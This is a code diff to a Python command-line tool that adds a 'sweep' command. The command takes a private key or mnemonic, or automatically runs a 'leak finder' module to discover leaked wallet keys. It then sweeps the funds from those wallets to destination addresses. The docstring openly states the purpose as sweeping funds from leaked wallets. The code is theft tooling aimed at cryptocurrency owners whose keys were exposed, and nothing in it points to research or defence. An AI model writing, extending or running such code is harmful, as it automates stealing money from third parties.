@@ -594,5 +594,52 @@ def monitor(
     asyncio.run(_monitor())
 
 
+@app.command()
+def sweep(
+    auto: bool = typer.Option(False, help="Auto-sweep all funded wallets from discovered keys"),
+    key: str = typer.Option(None, help="Specific private key to sweep"),
+    mnemonic: str = typer.Option(None, help="Specific mnemonic to sweep"),
+    chain: str = typer.Option("all", help="Chain to sweep: all, ethereum, solana, bitcoin"),
+    dry_run: bool = typer.Option(False, help="Dry run — show what would be swept without executing"),
+):
+    """Sweep funds from leaked wallets to destination addresses."""
+
+    async def _sweep():
+        from src.modules.crypto.balance.sweeper import Sweeper
+
+        sweeper = Sweeper()
+        await sweeper.start()
+
+        try:
+            if mnemonic:
+                typer.echo(f"Sweeping mnemonic: {mnemonic[:20]}...")
+                result = await sweeper.sweep_from_mnemonic(mnemonic, chain=chain, dry_run=dry_run)
+                typer.echo(json.dumps(result, indent=2, default=str))
+            elif key:
+                typer.echo(f"Sweeping key: {key[:10]}...")
+                result = await sweeper.sweep_from_key(key, chain=chain, dry_run=dry_run)
+                typer.echo(json.dumps(result, indent=2, default=str))
+            elif auto:
+                typer.echo("Auto-sweep: scanning for funded wallets...")
+                # Use leak finder to find keys, then sweep
+                from src.modules.crypto.leak_finder.coordinator import LeakFinderCoordinator
+                coordinator = LeakFinderCoordinator()
+                await coordinator.start()
+                result = await coordinator.run_once()
+                await coordinator.stop()
+
+                typer.echo(f"Found {result.funded_wallets} funded wallets")
+                if result.sweep_results:
+                    for sr in result.sweep_results:
+                        typer.echo(f"  Swept: {sr}")
+            else:
+                typer.echo("Specify --key, --mnemonic, or --auto", err=True)
+                raise typer.Exit(1)
+        finally:
+            await sweeper.stop()
+
+    asyncio.run(_sweep())
+
+
 if __name__ == "__main__":
     app()
